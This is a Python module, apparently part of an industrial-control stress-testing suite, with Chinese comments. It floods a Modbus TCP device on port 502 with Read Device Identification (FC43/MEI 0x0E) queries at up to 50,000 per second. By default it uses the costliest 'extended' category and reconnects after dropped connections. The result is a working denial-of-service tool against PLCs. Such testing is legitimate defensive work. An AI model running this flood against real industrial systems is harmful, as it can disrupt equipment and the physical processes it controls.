"""
測項：Modbus FC43/14（Read Device Identification, MEI Type 0x0E）高頻率查詢風暴
分類：Modbus TCP（資源消耗型，非單純流量型）
說明：FC43（Encapsulated Interface Transport，MEI Type 0x0E）用來查詢裝置的廠牌/型號/
版本等識別字串。跟 FC03 讀暫存器（固定寬度、直接記憶體映射）不同，多數韌體的裝置識別
回應是「當下組字串」（讀取多個內部欄位、字串串接、計算總長度、視需要分頁），這段組字串
邏輯往往比單純的暫存器讀取消耗更多 CPU 與暫時記憶體配置，尤其是查詢「Category 0x03
（Extended，可能包含所有廠商自訂物件）」時。高頻率送出這類查詢，測的是「查詢/識別功能」
這種非核心資料路徑上的資源消耗承受度，是跟核心讀寫功能碼（FC01/02/03/04/05/06/15/16）
互補的另一個攻擊面。

實作：原生 socket 直接組 MBAP + FC43 PDU（pymodbus 高階 client 對 MEI 類請求的封裝
在不同版本間差異較大，這裡改用底層 socket 手刻，行為更可控）。
"""
import socket
import struct
import time

from ..common import RateLimiter, clamp_duration

NAME = "Modbus FC43 裝置識別查詢風暴"
CATEGORY = "Modbus TCP"
PROTOCOL = "TCP"
DEFAULT_PORT = 502
TEST_TYPE = "resource"  # 裝置識別回應組字串成本，非單純比流量大小

_READ_DEVICE_ID_CODES = {
    "basic": 0x01,      # Category 0x01：基本物件（VendorName/ProductCode/Revision）
    "regular": 0x02,    # Category 0x02：一般物件（含 basic + VendorURL/ProductName/ModelName/UserApplicationName）
    "extended": 0x03,   # Category 0x03：擴充物件（可能含廠商自訂物件，組字串成本通常最高）
}


def get_param_schema() -> dict:
    return {
        "rate_per_sec": {"type": "int", "default": 50000, "min": 1, "max": 50000, "desc": "每秒查詢次數"},
        "category": {
            "type": "str", "default": "extended", "options": ["basic", "regular", "extended"],
            "desc": "查詢類別（extended 通常組字串成本最高，預設用它來測最壞情況）",
        },
        "unit_id": {"type": "int", "default": 1, "min": 0, "max": 247, "desc": "Slave ID"},
    }


def run(target, port, protocol, duration, params, stop_event, log_fn):
    duration = clamp_duration(duration)
    rate = int(params.get("rate_per_sec", 100))
    category_key = params.get("category", "extended")
    read_code = _READ_DEVICE_ID_CODES.get(category_key, 0x03)
    unit = int(params.get("unit_id", 1))

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(2.0)
        sock.connect((target, port))
    except OSError as e:
        log_fn(f"[!] 無法連線 {target}:{port}：{e}")
        return {"queries_sent": 0, "connected": False, "error": str(e)}

    limiter = RateLimiter(rate)
    sent, responses, timeouts, reconnects = 0, 0, 0, 0
    start = time.time()
    txn = 1

    log_fn(f"[+] 開始 FC43 裝置識別查詢風暴 @ {rate}/s，category={category_key}")

    while time.time() - start < duration and not (stop_event and stop_event.is_set()):
        limiter.wait()
        # PDU: FC(0x2B) + MEI Type(0x0E) + Read Device ID code + Object Id(從 0 開始)
        pdu = struct.pack(">BBBB", 0x2B, 0x0E, read_code, 0x00)
        mbap = struct.pack(">HHHB", txn, 0x0000, len(pdu) + 1, unit)
        txn = (txn + 1) % 0xFFFF
        try:
            sock.sendall(mbap + pdu)
            sent += 1
            try:
                resp = sock.recv(1024)
                if resp:
                    responses += 1
            except socket.timeout:
                timeouts += 1
        except OSError as e:
            log_fn(f"[!] 連線異常：{e}，嘗試重新連線")
            try:
                sock.close()
            except OSError:
                pass
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2.0)
                sock.connect((target, port))
                reconnects += 1
            except OSError as e2:
                log_fn(f"[!] 重新連線失敗：{e2}")
                break

    try:
        sock.close()
    except OSError:
        pass

    elapsed = time.time() - start
    log_fn(f"[+] 完成，送出 {sent} 次查詢，收到回應 {responses} 次，逾時 {timeouts} 次，重連 {reconnects} 次")
    return {
        "queries_sent": sent, "responses": responses, "timeouts": timeouts,
        "reconnects": reconnects, "elapsed_sec": round(elapsed, 1),
    }
